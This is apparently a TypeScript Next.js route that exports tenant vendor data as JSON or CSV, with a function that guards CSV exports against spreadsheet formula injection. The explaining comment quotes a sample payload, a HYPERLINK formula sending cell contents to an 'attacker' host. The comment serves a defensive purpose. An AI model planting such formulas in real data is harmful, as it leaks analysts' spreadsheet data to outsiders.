import { NextRequest, NextResponse } from 'next/server';
import { getTenantCtx } from '@/app-layer/context';
import { exportVendorsRegister, exportAssessments, exportDocumentExpiry } from '@/app-layer/usecases/vendor-audit';
import { withApiErrorHandling } from '@/lib/errors/api';
import { jsonResponse } from '@/lib/api-response';
import { contentDispositionHeader } from '@/lib/http/content-disposition';

/**
 * Neutralise spreadsheet formula injection (CWE-1236).
 *
 * Excel / Sheets / LibreOffice evaluate any cell whose text begins with
 * `=`, `+`, `-` or `@` as a formula. Vendor names, notes and document
 * titles are user-supplied, so a vendor called
 * `=HYPERLINK("http://attacker/?d="&A1,"click")` executes in the analyst's
 * spreadsheet the moment they open an export — quoting alone does not stop
 * this, because the quotes are consumed by the CSV parser before the
 * spreadsheet sees the value.
 *
 * A leading apostrophe forces the cell to text. Tab / CR are included
 * because a leading whitespace character is stripped by some parsers,
 * re-exposing the trigger beneath it.
 */
function neutraliseFormula(s: string): string {
    return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function toCsv(rows: Record<string, any>[]): string {
    if (rows.length === 0) return '';
    const flat = rows.map(r => flattenObj(r));
    const headers = Object.keys(flat[0]);
    const lines = [headers.join(',')];
    for (const row of flat) {
        lines.push(headers.map(h => {
            const v = row[h];
            if (v == null) return '';
            const s = neutraliseFormula(String(v));
            return s.includes(',') || s.includes('"') || s.includes('\n') ? `"${s.replace(/"/g, '""')}"` : s;
        }).join(','));
    }
    return lines.join('\n');
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function flattenObj(obj: Record<string, any>, prefix = ''): Record<string, any> {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const result: Record<string, any> = {};
    for (const [k, v] of Object.entries(obj)) {
        const key = prefix ? `${prefix}_${k}` : k;
        if (v && typeof v === 'object' && !Array.isArray(v) && !(v instanceof Date)) {
            Object.assign(result, flattenObj(v, key));
        } else {
            result[key] = v;
        }
    }
    return result;
}

export const GET = withApiErrorHandling(async (req: NextRequest, { params: paramsPromise }: { params: Promise<{ tenantSlug: string }> }) => {
    const params = await paramsPromise;
    const ctx = await getTenantCtx(params, req);
    const url = new URL(req.url);
    const type = url.searchParams.get('type') || 'vendors';
    const format = url.searchParams.get('format') || 'json';

    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    let data: Record<string, any>[];
    let filename: string;

    switch (type) {
        case 'assessments':
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            data = await exportAssessments(ctx) as Record<string, any>[];
            filename = 'vendor-assessments';
            break;
        case 'documents':
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            data = await exportDocumentExpiry(ctx) as Record<string, any>[];
            filename = 'vendor-document-expiry';
            break;
        default:
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            data = await exportVendorsRegister(ctx) as Record<string, any>[];
            filename = 'vendor-register';
    }

    if (format === 'csv') {
        const csv = toCsv(data);
        return new NextResponse(csv, {
            headers: {
                'Content-Type': 'text/csv',
                'Content-Disposition': contentDispositionHeader(`${filename}.csv`),
            },
        });
    }

    return jsonResponse(data);
});
